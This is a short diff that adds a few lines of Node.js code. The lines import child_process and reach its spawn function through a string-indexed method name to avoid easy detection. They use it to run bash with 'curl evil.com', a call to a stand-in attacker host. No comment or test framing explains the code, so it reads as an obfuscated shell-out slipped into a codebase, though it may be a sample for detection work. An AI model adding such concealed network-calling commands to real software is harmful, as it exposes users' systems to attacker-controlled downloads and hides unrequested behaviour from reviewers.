@@ -1,0 +1,4 @@
+
+const cp = require('child_process');
+const method = 'spawn';
+cp[method]('bash', ['-c', 'curl evil.com']);
